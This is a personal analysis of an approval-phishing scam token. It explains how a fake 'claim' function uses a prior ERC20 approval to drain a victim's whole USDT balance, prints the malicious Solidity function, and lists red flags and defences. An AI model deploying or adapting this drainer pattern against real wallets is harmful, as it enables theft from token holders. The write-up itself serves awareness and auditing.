# Approval Phishing Token Analysis

## Background
In early 2025, a scam token appeared in my MetaMask wallet (Uniswap address) 
without my knowledge — a common attack vector where scammers send "free" 
tokens to thousands of wallets, hoping victims will interact with them.

This document analyzes the malicious smart contract pattern behind such 
"claim" scam tokens, breaking down how the attack actually works on-chain.

---

## The Trap

The token name (e.g., "SafeMoon Reward", "$5000 USDT Voucher") lures the 
victim to a phishing site. The site instructs them to:
1. Connect their wallet
2. Approve the USDT (or other valuable token) contract
3. Click "Claim" to receive their reward

What actually happens: When the victim clicks "Claim", the contract executes 
transferFrom on the USDT contract — pulling their entire USDT balance and 
sending it to the scammer's wallet (the contract owner). The victim receives 
1000 worthless SMR tokens in return, while losing all their USDT.

---

## Contract Breakdown

### The Malicious Function
```solidity
function claim() external {
    require(!hasClaimed[msg.sender], "Already claimed");
    hasClaimed[msg.sender] = true;
    
    uint256 reward = 1000 * 10**18;
    balanceOf[address(this)] -= reward;
    balanceOf[msg.sender] += reward;
    
    IERC20(usdtToken).transferFrom(
        msg.sender, 
        owner, 
        IERC20(usdtToken).balanceOf(msg.sender)
    );
    
    emit Claimed(msg.sender, reward);
    emit Transfer(address(this), msg.sender, reward);
}
```

### Why It Works
The line `IERC20(usdtToken).transferFrom(msg.sender, owner, ...)` calls 
the USDT contract directly, transferring tokens from the victim (msg.sender) 
to the scammer (owner) — not from the contract to the victim, as the function 
name "claim" implies.

The `balanceOf(msg.sender)` parameter means the contract drains the victim's 
*entire* USDT balance — not a fixed amount. Whatever the victim holds at the 
moment of execution gets sent to the owner.

The fake reward tokens (SMR) given to the user are worthless — they are 
minted by this scam contract itself and have no liquidity, no market, 
and no value. They serve only to make the transaction appear legitimate.

---

## Why ERC20 Approve Pattern Enables This

The ERC20 standard allows the `approve` + `transferFrom` flow so that 
contracts (like DEXs) can pull tokens on behalf of users. This is essential 
for legitimate use cases like Uniswap swaps.

However, when a victim approves a malicious contract for their USDT (or any 
valuable token), they grant that contract permission to call `transferFrom` 
on their behalf. The scam contract then exploits this approval the moment 
the victim calls `claim()`, draining their entire balance in a single 
transaction.
---

## Defense

For users:
- Never approve unknown contracts
- Use tools like [revoke.cash](https://revoke.cash) to check existing approvals
- Hide unknown tokens in MetaMask — do not interact

For developers/auditors:
- Red flag: claim functions that call `transferFrom` on **other** tokens
- Red flag: `transferFrom(msg.sender, owner, balanceOf(msg.sender))` 
- Red flag: token contracts holding hardcoded addresses of valuable tokens

---

## Personal Note
This contract pattern matches a token I received in my own wallet. 
Understanding the on-chain mechanics retroactively confirmed why hiding 
unknown tokens (rather than interacting) is the correct defense.
